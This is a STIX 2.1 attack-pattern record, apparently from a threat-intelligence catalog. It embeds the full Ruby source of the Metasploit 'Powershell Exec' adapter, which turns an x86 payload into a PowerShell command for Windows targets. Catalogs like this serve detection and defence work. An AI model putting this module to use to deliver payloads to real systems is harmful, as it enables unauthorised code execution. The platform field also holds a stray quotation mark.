{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--541c4e1f-7bac-49c9-a089-e7773dc1c9d1",
    "created": "2024-08-14T16:33:19.27277Z",
    "modified": "2024-08-14T16:33:19.272774Z",
    "name": "Powershell Exec",
    "description": "Execute an x86 payload from a command via PowerShell",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/adapters/cmd/windows/powershell.rb",
            "external_id": "powershell.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nmodule MetasploitModule\n  include Msf::Payload::Adapter\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Powershell Exec',\n        'Description' => 'Execute an x86 payload from a command via PowerShell',\n        'Author' => 'Spencer McIntyre',\n        'Platform' => 'win',\n        'Arch' => ARCH_CMD,\n        'License' => MSF_LICENSE,\n        'AdaptedArch' => ARCH_X86,\n        'AdaptedPlatform' => 'win',\n        'RequiredCmd' => 'powershell'\n      )\n    )\n  end\n\n  def compatible?(mod)\n    # size is not unlimited due to the standard command length limit, the final size depends on the options that are\n    # configured but 3,000 is in a good range (can go up to 4,000 with default settings at this time)\n    if mod.type == Msf::MODULE_PAYLOAD && (mod.class.const_defined?(:CachedSize) && mod.class::CachedSize != :dynamic) && (mod.class::CachedSize >= 3_000)\n      return false\n    end\n\n    super\n  end\n\n  def generate(opts = {})\n    opts[:arch] ||= module_info['AdaptedArch']\n    payload = super\n\n    cmd_psh_payload(payload, ARCH_X86, remove_comspec: true)\n  end\n\n  def generate_stage(opts = {})\n    opts[:arch] ||= module_info['AdaptedArch']\n    super\n  end\n\n  def generate_payload_uuid(conf = {})\n    conf[:arch] ||= module_info['AdaptedArch']\n    conf[:platform] ||= module_info['AdaptedPlatform']\n    super\n  end\n\n  def handle_connection(conn, opts = {})\n    opts[:arch] ||= module_info['AdaptedArch']\n    super\n  end\nend\n",
    "x_mitre_platforms": [
        "win'"
    ]
}